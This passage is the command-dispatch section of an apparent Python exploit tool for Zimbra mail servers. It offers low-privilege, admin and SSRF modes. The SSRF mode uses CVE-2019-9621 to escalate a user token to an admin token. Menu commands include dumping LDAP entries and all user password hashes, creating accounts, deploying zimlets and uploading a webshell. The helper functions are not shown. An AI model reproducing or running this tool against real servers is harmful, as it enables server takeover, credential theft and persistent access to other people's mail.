        print("      %s https://192.168.1.1 zimbra password ssrf"%(sys.argv[0]))    
        sys.exit(0)
    else:
        if sys.argv[4]=='low':
            print("[*] Try to auth for low token")
            low_token = auth_request_low(sys.argv[1],sys.argv[2],sys.argv[3]) 
            print("[*] Command Mode")
            usage_low()
            while(1):
                cmd = input("[$] ")
                if cmd=='help':
                    usage_low()
                elif cmd=='DeleteMail':    
                    deletemail_request(sys.argv[1],low_token)
                elif cmd=='GetAllAddressLists':
                    getalladdresslists_request(sys.argv[1],low_token)
                elif cmd=='GetContacts':
                    getcontacts_request(sys.argv[1],low_token,sys.argv[2])
                elif cmd=='listallfoldersize':
                    getfolder_request(sys.argv[1],low_token)
                elif 'GetItem' in cmd:
                    cmdlist = cmd.split(' ')
                    getitem_request(sys.argv[1],low_token,cmdlist[1])
                elif 'GetMsg' in cmd:
                    cmdlist = cmd.split(' ')
                    getmsg_request(sys.argv[1],low_token,cmdlist[1])
                elif cmd=='SearchMail':    
                    searchmail_request(sys.argv[1],low_token)
                elif cmd=='SendTestMailToSelf':    
                    sendtestmailtoself_request(sys.argv[1],low_token,sys.argv[2])
                elif cmd=='uploadattachment':    
                    uploadattachment_request(sys.argv[1],low_token)
                elif cmd=='uploadattachmentraw':    
                    uploadattachmentraw_request(sys.argv[1],low_token)
                elif cmd=='viewmail':    
                    viewmail_request(sys.argv[1],low_token)
                elif cmd=='exit':
                    exit(0)
                else:
                    print("[!] Wrong parameter")

        elif sys.argv[4]=='admin':
            print("[*] Try to auth for admin token")
            admin_token = auth_request_admin(sys.argv[1],sys.argv[2],sys.argv[3])
            print("[*] Command Mode")
            usage_admin()
            while(1):
                cmd = input("[$] ")
                if cmd=='help':
                    usage_admin()
                elif cmd=='CreateAccount':
                    createaccount_request(sys.argv[1],admin_token)
                elif cmd=='DeleteAccount':
                    deleteaccount_request(sys.argv[1],admin_token)
                elif cmd=='DeployZimlet':
                    deployzimlet_request(sys.argv[1],admin_token)
                elif cmd=='UndeployZimlet':
                    undeployzimlet_request(sys.argv[1],admin_token)          
                elif cmd=='DeleteZimlet':
                    deletezimlet_request(sys.argv[1],admin_token)
                elif cmd=='GetAllZimlet':
                    getallzimlet_request(sys.argv[1],admin_token)
                elif cmd=='GetAccount':
                    getaccount_request(sys.argv[1],admin_token)
                elif cmd=='GetAllDomains':          
                    getalldomains_request(sys.argv[1],admin_token)
                elif cmd=='GetAllMailboxes':
                    getallmailboxes_request(sys.argv[1],admin_token)
                elif cmd=='GetAllAccounts':
                    getallaccounts_request(sys.argv[1],admin_token)
                elif cmd=='GetAllAdminAccounts':
                    getalladminaccounts_request(sys.argv[1],admin_token)
                elif cmd=='GetAllConfig':
                    getallconfig_request(sys.argv[1],admin_token)          
                elif cmd=='GetMemcachedClientConfig':
                    getmemcachedconfig_request(sys.argv[1],admin_token)
                elif cmd=='GetLDAPEntries':
                    print("[*] Input the ldapSearchBase1:")
                    print("Eg.")
                    print("cn=*")
                    ldapSearchBase1 = input("[>]:")
                    print("[*] Input the ldapSearchBase2:")
                    print("Eg.")
                    print("dc=zimbra,dc=com")
                    ldapSearchBase2 = input("[>]:")
                    getldapentries_request(sys.argv[1],admin_token,ldapSearchBase1,ldapSearchBase2)
                elif cmd=='getalluserhash':
                    print("[*] Input the ldapSearchBase:")
                    print("Eg.")
                    print("dc=zimbra,dc=com")
                    ldapSearchBase = input("[>]:")          
                    getalluserhash(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
                elif cmd=='GetServer':
                    getserver_request(sys.argv[1],admin_token)
                elif cmd=='GetServerNIfs':
                    getservernifs_request(sys.argv[1],admin_token)
                elif cmd=='GetServiceStatus':
                    getservicestats_request(sys.argv[1],admin_token)
                elif cmd=='GetToken':
                    gettoken_request(sys.argv[1],admin_token)
                elif cmd=='ModifyConfig':
                    modifyconfig_request(sys.argv[1],admin_token)
                elif cmd=='ModifyServer':
                    modifyserver_request(sys.argv[1],admin_token)
                elif cmd=='ReloadMemcachedClientConfig':
                    reloadmemcachedconfig_request(sys.argv[1],admin_token)
                elif cmd=='uploadwebshell':
                    uploadwebshell_request(sys.argv[1],admin_token)
                elif cmd=='uploadzimlet':
                    uploadzimlet_request(sys.argv[1],admin_token)
                elif cmd=='exit':
                    exit(0)
                else:
                    print("[!] Wrong parameter")

        elif sys.argv[4]=='ssrf':
            print("[*] Try to use CVE-2019-9621 to get the admin token")
            admin_token = lowtoken_to_admintoken_by_SSRF(sys.argv[1],sys.argv[2],sys.argv[3])
            usage_ssrf()
            while(1):
                cmd = input("[$] ")
                if cmd=='help':
                    usage_ssrf()
                elif cmd=='CreateAccountSSRF':          
                    createaccount_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='DeleteAccountSSRF':
                    deleteaccount_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='DeployZimletSSRF':
                    deployzimlet_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='UndeployZimletSSRF':
                    undeployzimlet_requestSSRF(sys.argv[1],admin_token)          
                elif cmd=='DeleteZimletSSRF':
                    deletezimlet_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='GetAllZimletSSRF':
                    getallzimlet_requestSSRF(sys.argv[1],admin_token)          
                elif cmd=='GetAccountSSRF':
                    getaccount_requestSSRF(sys.argv[1],admin_token)          
                elif cmd=='GetAllDomainsSSRF':          
                    getalldomains_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='GetAllMailboxesSSRF':
                    getallmailboxes_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='GetAllAccountsSSRF':
                    getallaccounts_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='GetAllAdminAccountsSSRF':
                    getalladminaccounts_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='GetAllConfigSSRF':
                    getallconfig_requestSSRF(sys.argv[1],admin_token)          
                elif cmd=='GetMemcachedClientConfigSSRF':
                    getmemcachedconfig_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='GetLDAPEntriesSSRF':
                    print("[*] Input the ldapSearchBase1:")
                    print("Eg.")
                    print("cn=*")
                    ldapSearchBase1 = input("[>]:")
                    print("[*] Input the ldapSearchBase2:")
                    print("Eg.")
                    print("dc=zimbra,dc=com")
                    ldapSearchBase2 = input("[>]:")
                    getldapentries_requestSSRF(sys.argv[1],admin_token,ldapSearchBase1,ldapSearchBase2)
                elif cmd=='getalluserhashSSRF':
                    print("[*] Input the ldapSearchBase:")
                    print("Eg.")
                    print("dc=zimbra,dc=com")
                    ldapSearchBase = input("[>]:")          
                    getalluserhashSSRF(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
                elif cmd=='GetServerSSRF':
                    getserver_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='GetServerNIfsSSRF':
                    getservernifs_requestSSRF(sys.argv[1],admin_token)          
                elif cmd=='GetServiceStatusSSRF':
                    getservicestats_requestSSRF(sys.argv[1],admin_token)                        
                elif cmd=='GetTokenSSRF':
                    gettoken_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='ModifyConfigSSRF':
                    modifyconfig_requestSSRF(sys.argv[1],admin_token)          
                elif cmd=='ModifyServerSSRF':
                    modifyserver_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='ReloadMemcachedClientConfigSSRF':
                    reloadmemcachedconfig_requestSSRF(sys.argv[1],admin_token)
                elif cmd=='uploadwebshell':
                    uploadwebshell_request(sys.argv[1],admin_token)
                elif cmd=='uploadzimlet':
                    uploadzimlet_request(sys.argv[1],admin_token)           
                elif cmd=='exit':
                    exit(0)
                else:
                    print("[!] Wrong parameter")
        else:
            print("[!] Wrong parameter")
